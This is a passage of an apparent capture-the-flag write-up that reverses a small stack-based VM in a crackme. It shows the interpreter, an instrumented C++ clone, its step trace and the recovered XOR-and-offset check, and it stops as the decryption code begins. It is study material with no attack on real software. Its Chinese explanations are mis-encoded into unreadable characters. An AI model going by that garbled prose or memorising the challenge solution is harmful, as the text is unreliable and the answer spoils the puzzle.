&#123;</span><br><span class="line">        <span class="type">int</span> opcode = opcodes[<span class="built_in">int</span>(ip)];</span><br><span class="line">        <span class="type">int</span> arg    = opcodes[<span class="built_in">int</span>(ip)<span class="number">+1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (opcode)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                stack_data[sp++] = co_consts[arg];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">                <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a + b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">                <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a - b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">                <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = a ^ b;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">                <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">                stack_data[sp++] = <span class="built_in">int</span>(a == b);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">bool</span> ok = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stack_data[i] != (cipher[i] - <span class="number">20</span>))</span><br><span class="line">                    &#123; </span><br><span class="line">                        ok = <span class="literal">false</span>; </span><br><span class="line">                        <span class="keyword">break</span>; </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                verdict = ok ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> c = stack_data[--sp];</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="number">0</span>) ip = <span class="built_in">uint</span>(arg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                verdict = <span class="number">500</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ip+=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    verdict = <span class="number">501</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªç®€æ˜“VMï¼Œé€šè¿‡å¼€å¤´å‡ ä¸ªå‚æ•°çš„bindingå€¼ï¼Œ02345å¯ä»¥åœ¨IDAæ‰¾åˆ°å¯¹åº”çš„å˜é‡ï¼Œç„¶ååœ¨ä¸Šé¢ä»£ç å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„èµ„æºæ•°æ®ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-10.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-11.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-12.png" alt="alt text"></p><p>è¿™è¾¹å°±æ˜¯åˆ¤æ–­è¾“å…¥flagé•¿åº¦ã€æ ¼å¼ï¼Œç„¶åå°†æ‹¬å·å†…æ¯ä¸¤ä¸ªå­—èŠ‚è¿›è¡Œunhexå­˜å…¥co_constså‰åå…­ä¸ªä½ç½®ã€‚</p><p>å¦‚ï¼šâ€1f3d22â€ -&gt; {0x1f,0x3d,0x22}</p><p><img src="/2025/07/14/L3HCTF/image-13.png" alt="alt text"></p><p>è¿™è¾¹é‡‡ç”¨åŒæ„VMä»£ç ï¼Œé€šè¿‡è¾“å‡ºæµç¨‹æ¥ç ”ç©¶åŠ å¯†ã€‚</p><p>åŒæ„ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> opcodes[<span class="number">168</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000011</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000012</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000013</span>,</span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000014</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000005</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000015</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000016</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000017</span>,</span><br><span class="line">    <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000018</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000019</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x0000000A</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001B</span>,</span><br><span class="line">    <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x0000001C</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000D</span>,</span><br><span class="line">    <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000F</span>,</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x0000000E</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000010</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000010</span>, <span class="number">0x00000002</span>, <span class="number">0x00000011</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000012</span>, <span class="number">0x00000054</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> cipher[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x000000F3</span>, <span class="number">0x00000082</span>, <span class="number">0x00000006</span>, <span class="number">0x000001FD</span>, <span class="number">0x00000150</span>, <span class="number">0x00000038</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000DE</span>,</span><br><span class="line">    <span class="number">0x0000015A</span>, <span class="number">0x00000197</span>, <span class="number">0x0000009C</span>, <span class="number">0x000001D7</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000028</span>, <span class="number">0x00000146</span>, <span class="number">0x00000097</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> co_consts[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000000B0</span>, <span class="number">0x000000C8</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000086</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000008F</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000BF</span>,</span><br><span class="line">    <span class="number">0x000000C9</span>, <span class="number">0x00000064</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000E3</span>, <span class="number">0x000000EF</span>, <span class="number">0x00000087</span>, <span class="number">0x00000000</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> stack_data[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxInstructionCount = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> ip = <span class="number">0u</span>;</span><br><span class="line">    <span class="type">int</span> sp = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> verdict = <span class="number">-233</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (ip &lt; MaxInstructionCount)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> opcode = opcodes[<span class="built_in">int</span>(ip)];</span><br><span class="line">        <span class="type">int</span> arg = opcodes[<span class="built_in">int</span>(ip) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (opcode)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = co_consts[%d];\n&quot;</span>, sp, arg);</span><br><span class="line">            stack_data[sp++] = co_consts[arg];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">            <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = stack_data[%d]+stack_data[%d];\n&quot;</span>, sp, sp, sp + <span class="number">1</span>);</span><br><span class="line">            stack_data[sp++] = a + b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">            <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = stack_data[%d]-stack_data[%d];\n&quot;</span>, sp, sp + <span class="number">1</span>, sp);</span><br><span class="line">            stack_data[sp++] = a - b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">            <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = stack_data[%d]^stack_data[%d];\n&quot;</span>, sp, sp, sp<span class="number">+1</span>,a^b);</span><br><span class="line">            stack_data[sp++] = a ^ b;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> b = stack_data[--sp];</span><br><span class="line">            <span class="type">int</span> a = stack_data[--sp];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;stack_data[%d] = stack_data[%d]==stack_data[%d];\n&quot;</span>, sp, sp, sp<span class="number">+1</span>);</span><br><span class="line">            stack_data[sp++] = <span class="built_in">int</span>(a == b);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Compare...\n&quot;</span>);</span><br><span class="line">            <span class="type">bool</span> ok = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (stack_data[i] != (cipher[i] - <span class="number">20</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            verdict = ok ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> c = stack_data[--sp];</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="number">0</span>) ip = arg;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            verdict = <span class="number">500</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ip += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    verdict = <span class="number">501</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">stack_data[0] = co_consts[0];</span><br><span class="line">stack_data[1] = co_consts[1];</span><br><span class="line">stack_data[2] = co_consts[0];</span><br><span class="line">stack_data[1] = stack_data[1]^stack_data[2];</span><br><span class="line">stack_data[2] = co_consts[16];</span><br><span class="line">stack_data[1] = stack_data[2]-stack_data[1];</span><br><span class="line">stack_data[2] = co_consts[2];</span><br><span class="line">stack_data[3] = co_consts[1];</span><br><span class="line">stack_data[2] = stack_data[2]^stack_data[3];</span><br><span class="line">stack_data[3] = co_consts[17];</span><br><span class="line">stack_data[2] = stack_data[3]-stack_data[2];</span><br><span class="line">stack_data[3] = co_consts[3];</span><br><span class="line">stack_data[4] = co_consts[2];</span><br><span class="line">stack_data[3] = stack_data[3]^stack_data[4];</span><br><span class="line">stack_data[4] = co_consts[18];</span><br><span class="line">stack_data[3] = stack_data[3]+stack_data[4];</span><br><span class="line">stack_data[4] = co_consts[4];</span><br><span class="line">stack_data[5] = co_consts[3];</span><br><span class="line">stack_data[4] = stack_data[4]^stack_data[5];</span><br><span class="line">stack_data[5] = co_consts[19];</span><br><span class="line">stack_data[4] = stack_data[4]+stack_data[5];</span><br><span class="line">stack_data[5] = co_consts[5];</span><br><span class="line">stack_data[6] = co_consts[4];</span><br><span class="line">stack_data[5] = stack_data[5]^stack_data[6];</span><br><span class="line">stack_data[6] = co_consts[20];</span><br><span class="line">stack_data[5] = stack_data[6]-stack_data[5];</span><br><span class="line">stack_data[6] = co_consts[6];</span><br><span class="line">stack_data[7] = co_consts[5];</span><br><span class="line">stack_data[6] = stack_data[6]^stack_data[7];</span><br><span class="line">stack_data[7] = co_consts[21];</span><br><span class="line">stack_data[6] = stack_data[6]+stack_data[7];</span><br><span class="line">stack_data[7] = co_consts[7];</span><br><span class="line">stack_data[8] = co_consts[6];</span><br><span class="line">stack_data[7] = stack_data[7]^stack_data[8];</span><br><span class="line">stack_data[8] = co_consts[22];</span><br><span class="line">stack_data[7] = stack_data[7]+stack_data[8];</span><br><span class="line">stack_data[8] = co_consts[8];</span><br><span class="line">stack_data[9] = co_consts[7];</span><br><span class="line">stack_data[8] = stack_data[8]^stack_data[9];</span><br><span class="line">stack_data[9] = co_consts[23];</span><br><span class="line">stack_data[8] = stack_data[8]+stack_data[9];</span><br><span class="line">stack_data[9] = co_consts[9];</span><br><span class="line">stack_data[10] = co_consts[8];</span><br><span class="line">stack_data[9] = stack_data[9]^stack_data[10];</span><br><span class="line">stack_data[10] = co_consts[24];</span><br><span class="line">stack_data[9] = stack_data[9]+stack_data[10];</span><br><span class="line">stack_data[10] = co_consts[10];</span><br><span class="line">stack_data[11] = co_consts[9];</span><br><span class="line">stack_data[10] = stack_data[10]^stack_data[11];</span><br><span class="line">stack_data[11] = co_consts[25];</span><br><span class="line">stack_data[10] = stack_data[10]+stack_data[11];</span><br><span class="line">stack_data[11] = co_consts[11];</span><br><span class="line">stack_data[12] = co_consts[10];</span><br><span class="line">stack_data[11] = stack_data[11]^stack_data[12];</span><br><span class="line">stack_data[12] = co_consts[26];</span><br><span class="line">stack_data[11] = stack_data[11]+stack_data[12];</span><br><span class="line">stack_data[12] = co_consts[12];</span><br><span class="line">stack_data[13] = co_consts[11];</span><br><span class="line">stack_data[12] = stack_data[12]^stack_data[13];</span><br><span class="line">stack_data[13] = co_consts[27];</span><br><span class="line">stack_data[12] = stack_data[13]-stack_data[12];</span><br><span class="line">stack_data[13] = co_consts[13];</span><br><span class="line">stack_data[14] = co_consts[12];</span><br><span class="line">stack_data[13] = stack_data[13]^stack_data[14];</span><br><span class="line">stack_data[14] = co_consts[28];</span><br><span class="line">stack_data[13] = stack_data[14]-stack_data[13];</span><br><span class="line">stack_data[14] = co_consts[14];</span><br><span class="line">stack_data[15] = co_consts[13];</span><br><span class="line">stack_data[14] = stack_data[14]^stack_data[15];</span><br><span class="line">stack_data[15] = co_consts[29];</span><br><span class="line">stack_data[14] = stack_data[14]+stack_data[15];</span><br><span class="line">stack_data[15] = co_consts[15];</span><br><span class="line">stack_data[16] = co_consts[14];</span><br><span class="line">stack_data[15] = stack_data[15]^stack_data[16];</span><br><span class="line">stack_data[16] = co_consts[30];</span><br><span class="line">stack_data[15] = stack_data[16]-stack_data[15];</span><br><span class="line">Compare...</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç ”ç©¶ä¸Šé¢æµç¨‹è¾“å‡ºï¼Œå¯ä»¥å‘ç°co_constsé‡Œé¢å­˜åœ¨çš„é‚£åäº”ä¸ªæ•´æ•°æ˜¯ä½œä¸ºä¸€ä¸ªkeyçš„ä½œç”¨ï¼Œç„¶ååˆ†ä¸ºä¸¤ç§åŠ å¯†ã€‚</p><ol><li>å¯†æ–‡&#x3D;å¯†é’¥[i-1]-(æ˜æ–‡[i]^æ˜æ–‡[i-1])</li><li>å¯†æ–‡&#x3D;(æ˜æ–‡[i]^æ˜æ–‡[i-1])+å¯†é’¥[i-1]</li></ol><p><strong>1,2,5,12,13,15</strong>ä¸‹æ ‡æ˜¯ç¬¬ä¸€ç§ï¼Œå…¶ä½™æ˜¯ç¬¬äºŒç§åŠ å¯†ã€‚</p><h3 id="è§£å¯†ä»£ç -1"><a href="#è§£å¯†ä»£ç -1" class="headerlink" title="è§£å¯†ä»£ç "></a>è§£å¯†ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 